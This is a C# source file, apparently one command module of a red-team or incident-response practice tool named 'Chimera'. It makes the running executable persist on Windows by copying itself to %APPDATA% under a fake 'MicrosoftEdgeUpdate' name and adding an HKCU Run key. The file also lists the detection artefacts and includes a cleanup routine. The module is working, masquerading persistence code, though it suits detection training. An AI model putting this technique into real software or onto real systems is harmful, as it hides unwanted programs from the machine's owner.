using System;
using System.IO;
using Microsoft.Win32;

namespace Chimera.Commands
{
    // Persist — copies the running EXE to %APPDATA%\MicrosoftEdgeUpdate.exe
    // and sets HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    //
    // IR detection practice: this creates two observable artefacts —
    //   1. A new file in %APPDATA%
    //   2. A new HKCU Run registry value
    // Both are trivially visible in Autoruns, Process Monitor, and Sysmon Event ID 13.
    public static class Persist
    {
        // Registry key and value name — chosen to blend with common software
        private const string RegKey   = @"Software\Microsoft\Windows\CurrentVersion\Run";
        private const string RegValue = "MicrosoftEdgeUpdate";
        private const string FileName = "MicrosoftEdgeUpdate.exe";

        public static string Execute()
        {
            try
            {
                // Where we copy ourselves to
                string appData  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string destPath = Path.Combine(appData, FileName);

                // Path of the currently running EXE
                string selfPath = System.Reflection.Assembly.GetExecutingAssembly().Location;

                // Copy self to AppData (overwrite if exists)
                File.Copy(selfPath, destPath, overwrite: true);

                // Set HKCU Run key
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                {
                    if (key == null)
                        return $"[error] Could not open registry key: HKCU\\{RegKey}";

                    key.SetValue(RegValue, $"\"{destPath}\"", RegistryValueKind.String);
                }

                return $"[+] Persisted.\n" +
                       $"    File:     {destPath}\n" +
                       $"    RegKey:   HKCU\\{RegKey}\n" +
                       $"    RegValue: {RegValue}\n\n" +
                       $"IR artefacts to find:\n" +
                       $"  Autoruns:        HKCU Run tab -> {RegValue}\n" +
                       $"  Process Monitor: File Write to {destPath}\n" +
                       $"  Sysmon EID 13:   Registry value set on HKCU\\...\\Run";
            }
            catch (Exception ex)
            {
                return $"[error] {ex.Message}";
            }
        }

        // Remove persistence — useful for cleanup after IR practice
        public static string Remove()
        {
            var results = new System.Text.StringBuilder();
            try
            {
                string appData  = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string destPath = Path.Combine(appData, FileName);

                if (File.Exists(destPath))
                {
                    File.Delete(destPath);
                    results.AppendLine($"[+] Deleted: {destPath}");
                }
                else
                {
                    results.AppendLine($"[-] File not found: {destPath}");
                }
            }
            catch (Exception ex) { results.AppendLine($"[error] File delete: {ex.Message}"); }

            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKey, writable: true))
                {
                    if (key != null && key.GetValue(RegValue) != null)
                    {
                        key.DeleteValue(RegValue);
                        results.AppendLine($"[+] Deleted registry value: HKCU\\{RegKey}\\{RegValue}");
                    }
                    else
                    {
                        results.AppendLine($"[-] Registry value not found.");
                    }
                }
            }
            catch (Exception ex) { results.AppendLine($"[error] Registry delete: {ex.Message}"); }

            return results.ToString();
        }
    }
}
